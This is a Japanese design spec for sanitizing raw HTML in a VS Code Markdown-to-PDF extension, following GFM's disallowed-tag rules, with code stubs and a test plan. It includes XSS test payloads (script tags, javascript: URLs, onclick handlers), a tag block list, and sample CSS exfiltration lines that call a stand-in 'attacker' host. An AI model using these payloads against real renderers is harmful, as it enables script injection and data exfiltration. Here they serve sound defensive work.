# Raw HTML サニタイズ — 設計仕様

## 背景

現在、この拡張機能は Markdown 内のRaw HTML タグを検証なしですべて通過させている。
markdown-it のオプションで `html: true` を指定しているため、`<script>`, `<iframe>` などの危険な HTML 構造が PDF レンダリングやプレビュー時に注入・実行される可能性がある。

参考: [GitHub Issue #411](https://github.com/yzane/vscode-markdown-pdf/issues/411)

### 関連仕様

- John Gruber の元来の Markdown 仕様では任意のRaw HTML を許容していた
- GitHub Flavored Markdown (GFM) は危険な HTML を明示的に制限している:
  [GFM Spec - 6.11 Disallowed Raw HTML (extension)](https://github.github.com/gfm/#disallowed-raw-html-extension-)

### 現状の処理経路（`src/extension.ts` / `src/utils.ts`）

- `buildMarkdownItOptions()` で `html: true` を指定（`src/utils.ts`）
- 非 HTML 出力時のみ `md.renderer.rules.html_block` を `transformHtmlBlock()` で差し替え、img の src 書換えと自己閉じタグ正規化を行う
- `transformHtmlBlock()` は `<script>`, `<style>`, `<textarea>` を raw text element としてそのまま温存する実装

## 方針

GFM の Disallowed Raw HTML Extension に準拠したサニタイズ層を、`markdown-it` の `html_block` / `html_inline` レンダラで適用する。

- サニタイズ対象は **ユーザー由来のRaw HTML のみ**（`html_block` / `html_inline` トークン）
- 拡張側が自動生成する HTML（`<div class="mermaid">`、`<pre class="hljs">`、emoji/PlantUML の `<img>`、テンプレートの `<script>` 等）はレンダラを通らないため **射程外**
- 挙動はユーザー設定 `markdown-pdf.sanitize` で切替可能
- **front matter によるファイル単位のオーバーライドは提供しない**（悪意ある Markdown が自身でサニタイズを無効化できてしまうため）

### サニタイズ対象の境界

サニタイズは **Markdown 本文内のユーザー由来Raw HTML のみ** を対象とする。以下はサニタイズ対象外:

| 対象 | 理由 |
|---|---|
| `markdown-pdf.styles` で指定された外部 CSS | ユーザー設定による明示的指定。信頼境界がユーザー側にあり、CSS サニタイズは技術的にも困難（`url()` や属性セレクタの一律ブロックは正当な用途を壊す） |
| 拡張内蔵の CSS（default / highlight.js） | 開発者管理下のコード |
| テンプレート `template/template.html` の内容 | 開発者管理下のコード |
| 拡張が自動生成する HTML（mermaid / hljs / emoji / PlantUML 出力） | markdown-it の `html_block` / `html_inline` トークンを通らず、レンダラ差し替えの射程外 |

外部 CSS ファイル自体が攻撃ベクタを持ちうる点（`@import`, `url()`, 属性セレクタによる exfiltration 等）については README でユーザーに注意喚起する。

### インクルードされたファイルの扱い

Include 機能（`:[alt](path.md)`）でインクルードされたファイルの内容も、**インクルード展開後に markdown-it の通常パースを通るため、Raw HTML は `html_block` / `html_inline` トークンとなり、同じサニタイザが適用される**。

実装上の根拠: 内製 include プラグイン（`src/markdown-it-include.ts`）は `md.core.ruler.before('normalize', 'include', ...)` で `state.src` レベルの置換を行う。置換後の結合ソースが markdown-it の通常パースに入るため、インクルード先のRaw HTML も親ファイルと区別なく `html_block` / `html_inline` トークン化される。

この保証は「レンダラ層でサニタイズする」本設計によって自動的に成立し、追加実装は不要。サニタイズを markdown-it の入力ソース段階で行う設計にするとインクルード未展開分が素通しになるため、**レンダラ層選択の根拠の一つ** でもある。

## 変更内容

### 1. 新規設定項目 `markdown-pdf.sanitize`

`package.json` の `contributes.configuration.properties` に以下を追加する。

```json
"markdown-pdf.sanitize": {
  "type": "string",
  "enum": ["gfm", "gfm-allow-style", "none"],
  "default": "gfm",
  "description": "Sanitize raw HTML in Markdown to mitigate XSS-like risks during preview and PDF rendering. 'gfm' removes dangerous tags per GitHub Flavored Markdown. 'gfm-allow-style' keeps <style> for PDF layout customization (note: CSS can still exfiltrate data via url()/@import). 'none' disables sanitization (legacy behavior, not recommended)."
}
```

### 2. モードごとの挙動

| 値 | 危険タグ | `<style>` | `on*` 属性 | `javascript:` URL |
|----|----|----|----|----|
| `"gfm"` (既定) | 除去 | **除去** | 除去 | 除去 |
| `"gfm-allow-style"` | 除去 | **通過** | 除去 | 除去 |
| `"none"` | 通過 | 通過 | 通過 | 通過 |

**`"gfm"` / `"gfm-allow-style"` で除去される対象**（GFM 仕様準拠）:

- タグ: `<title>`, `<textarea>`, `<style>`, `<xmp>`, `<iframe>`, `<noembed>`, `<noframes>`, `<script>`, `<plaintext>`
  （`"gfm-allow-style"` の場合は `<style>` を除く）
- 属性: `on*`（`onclick`, `onload` 等のイベントハンドラ全般）
- URL スキーム: `href` / `src` の `javascript:`

出典: [GFM Spec - 6.11 Disallowed Raw HTML (extension)](https://github.github.com/gfm/#disallowed-raw-html-extension-)

### 3. サニタイズ処理の実装

`src/utils.ts` にサニタイザ関数を追加する。

```typescript
export type SanitizeMode = 'gfm' | 'gfm-allow-style' | 'none';

/** Returns the set of tag names to strip for the given sanitize mode. */
export function getDisallowedTags(mode: SanitizeMode): Set<string> {
  if (mode === 'none') return new Set();
  const base = new Set(['title', 'textarea', 'style', 'xmp', 'iframe', 'noembed', 'noframes', 'script', 'plaintext']);
  if (mode === 'gfm-allow-style') base.delete('style');
  return base;
}

/** Sanitizes raw HTML per GFM's disallowed raw HTML extension. */
export function sanitizeRawHtml(html: string, mode: SanitizeMode): string {
  if (mode === 'none' || !html) return html;
  // 1. Strip disallowed tags (both opening and closing forms, including their content for raw text elements)
  // 2. Strip on* event handler attributes
  // 3. Strip javascript: in href/src
  // Implementation details TBD in the plan phase.
}
```

### 4. レンダラ差し替え

`src/extension.ts` の `convertMarkdownToHtml()` 内で `html_block` / `html_inline` レンダラを差し替える。

- 既存の `md.renderer.rules.html_block`（非 HTML 出力時の `transformHtmlBlock` 呼び出し）と統合
- `html_inline` は新規に差し替える
- 処理順序: **サニタイズ → `transformHtmlBlock`**（サニタイズ後に img src 書換えや自己閉じタグ正規化を行う）

```typescript
const sanitizeMode: SanitizeMode = vscode.workspace.getConfiguration('markdown-pdf')['sanitize'] || 'gfm';

md.renderer.rules.html_block = function (tokens, idx) {
  const sanitized = utils.sanitizeRawHtml(tokens[idx].content, sanitizeMode);
  return type !== 'html' ? utils.transformHtmlBlock(sanitized, filename) : sanitized;
};

md.renderer.rules.html_inline = function (tokens, idx) {
  return utils.sanitizeRawHtml(tokens[idx].content, sanitizeMode);
};
```

### 5. `transformHtmlBlock()` の raw text element 取り扱い見直し

現状 `transformHtmlBlock()` は `<script>`, `<style>`, `<textarea>` を raw text element として内容ごと温存している。
サニタイズが先行する場合、`"gfm"` モードでは既にこれらが除去されているため、この温存処理は `"none"` モードでのみ意味を持つ。
既存ロジックはそのまま維持する（サニタイズで除去されなかった場合の保険として機能する）。

## ドキュメント更新

### 1. README.md / README.ja.md

- 新設定 `markdown-pdf.sanitize` のセクション追加
- **サニタイズを導入した理由を簡潔に記載**:
  - 従来は Markdown 内のRaw HTML をすべて素通しにしており、`<script>` や `<iframe>` 等が PDF レンダリング／プレビュー時に実行される XSS のリスクがあった（Issue #411）
  - GFM (GitHub Flavored Markdown) の Disallowed Raw HTML Extension に準拠して危険タグ・属性を既定で除去する
- `"gfm"` モードで禁止される具体タグ一覧を記載（[GFM Spec 6.11](https://github.github.com/gfm/#disallowed-raw-html-extension-) 準拠）
- 各モードの想定利用シーン:
  - `"gfm"`: 他人の Markdown も扱う通常利用。PDF カスタマイズは `markdown-pdf.styles` で行う
  - `"gfm-allow-style"`: 自分の Markdown に `<style>` で CSS を同梱して 1 ファイル完結の PDF を作るケース（CSS の安全性は自己責任）
  - `"none"`: 従来互換（非推奨）
- `<style>` を使った既存ユーザー向けの移行先として `markdown-pdf.styles`（外部 CSS ファイル指定）を案内
- `markdown-pdf.styles` 利用時の注意:
  - CSS 自体が攻撃ベクタを持ちうる（`@import url()`、`background: url()`、属性セレクタによるデータ抽出等）ため、信頼できる CSS ファイルのみ指定する
  - `markdown-pdf.stylesRelativePathFile: true` 使用時は、開く Markdown の配置ディレクトリにも注意
- `"gfm-allow-style"` のリスク注記（上記 CSS 攻撃ベクタが本文内 `<style>` 経由で流入しうる）

### 2. Breaking Changes 記載

CHANGELOG.md および README に、既定値が `"gfm"` となることで以下の挙動変更が発生する旨を記載する:

- Markdown 本文内の `<script>`, `<iframe>`, `<style>`, `<textarea>`, `<title>`, `<xmp>`, `<noembed>`, `<noframes>`, `<plaintext>` タグが除去される
- `on*` イベントハンドラ属性が除去される
- `javascript:` URL が除去される
- 従来の挙動を維持したい場合は `markdown-pdf.sanitize: "none"` を設定
- `<style>` のみ維持したい場合は `markdown-pdf.sanitize: "gfm-allow-style"` を設定（ただし CSS exfiltration のリスクあり）

## 対象ファイル

- `package.json` — `markdown-pdf.sanitize` 設定追加
- `src/utils.ts` — `SanitizeMode` 型、`getDisallowedTags()`、`sanitizeRawHtml()` 追加
- `src/extension.ts` — `html_block` / `html_inline` レンダラ差し替え
- `README.md` / `README.ja.md` — 設定説明、禁止タグ一覧、`<style>` 代替案、Breaking Changes
- `CHANGELOG.md` — Breaking Changes 記載
- `test/utils.test.ts` — サニタイズのユニットテスト追加

## テスト方針

### ユニットテスト

`sanitizeRawHtml()` に対して以下を確認:

#### `"gfm"` モード
- `<script>alert(1)</script>` → 除去
- `<iframe src="..."></iframe>` → 除去
- `<style>body{}</style>` → 除去
- `<textarea>foo</textarea>` → 除去
- `<div onclick="...">x</div>` → `onclick` 属性のみ除去、`<div>x</div>` が残る
- `<a href="javascript:alert(1)">x</a>` → `href` 除去または `href="about:blank"` 等に置換
- `<img src="javascript:alert(1)">` → `src` 除去
- `<div class="note">text</div>` → そのまま通過
- `<b>bold</b>`, `<i>italic</i>` 等の通常タグ → そのまま通過
- 大文字タグ (`<SCRIPT>`) → 除去
- 属性値の引用符バリエーション（ダブル/シングル/無引用）に対応

#### `"gfm-allow-style"` モード
- `<style>body{color:red}</style>` → そのまま通過
- `<script>` 等他の危険タグは除去される

#### `"none"` モード
- すべて素通し

### 統合テスト

- Markdown → HTML 変換全体で、サニタイズ後に `transformHtmlBlock()` による img src 書換え・自己閉じタグ正規化が正常動作すること
- 拡張生成の `<div class="mermaid">`、`<pre class="hljs">`、emoji/PlantUML の `<img>` がサニタイズの影響を受けないこと
- テンプレート (`template/template.html`) の `<script>` がそのまま維持されること

### 手動検証

- `<script>alert(1)</script>` を含む Markdown を PDF 変換し、alert が発火しないこと
- `<style>@page { size: A3 }</style>` を含む Markdown で、`"gfm"` では効かず、`"gfm-allow-style"` および `"none"` では効くこと
- 既存のサンプル Markdown の PDF 出力が `"gfm"` モードで視覚的に崩れないこと

## リスクと注意事項

### `"gfm-allow-style"` の残存リスク

`<style>` を許可するモードでは、以下の CSS 攻撃手法が依然として成立する:

- `@import url(http://attacker/...)` による外部リソース取得
- `background: url(http://attacker/leak)` によるトラッキング
- 属性セレクタ + `url()` による DOM 内容の exfiltration
- `content: url(...)`, `list-style-image` 等による外部読込
- `position: fixed; z-index` によるオーバーレイ

これらは Puppeteer 経由の PDF 変換時に実際にネットワーク要求が発生するため、`gfm-allow-style` を選ぶユーザーには **信頼できる Markdown のみに適用する** よう README で注意喚起する。

### 既存ユーザーへの影響

既定値が `"gfm"` となるため、以下のユーザーは挙動変更に遭遇する:

- Markdown 本文に `<style>` を書いて PDF レイアウトを調整していたユーザー
  → `markdown-pdf.styles` への移行、または `markdown-pdf.sanitize: "gfm-allow-style"` 設定
- Markdown に `<iframe>` 等を埋め込んでいたユーザー（稀）
  → `markdown-pdf.sanitize: "none"` 設定（自己責任）

Breaking Changes として CHANGELOG / README で明示する。

### front matter override を提供しない理由

セキュリティ設定を front matter でオーバーライドできると、悪意ある Markdown ファイルが自身でサニタイズを無効化できてしまい、機能として意味を失う。
`markdown-pdf.sanitize` はユーザー設定（VS Code settings）でのみ制御する。

## 未確定事項（実装計画フェーズで決定）

- `sanitizeRawHtml()` の具体実装方針: 既存の手書き HTML スキャナ（`findHtmlTagEnd()` 等）を拡張する方向か、別途実装するか
- `javascript:` URL の除去後の扱い（属性ごと削除 / 空文字置換 / `about:blank` 置換）
- raw text element 内容（`<script>foo</script>` の `foo` 部分）の扱い: タグのみ除去で本文は残すか、本文ごと除去か（GFM では内容も含めて plaintext 化する挙動）
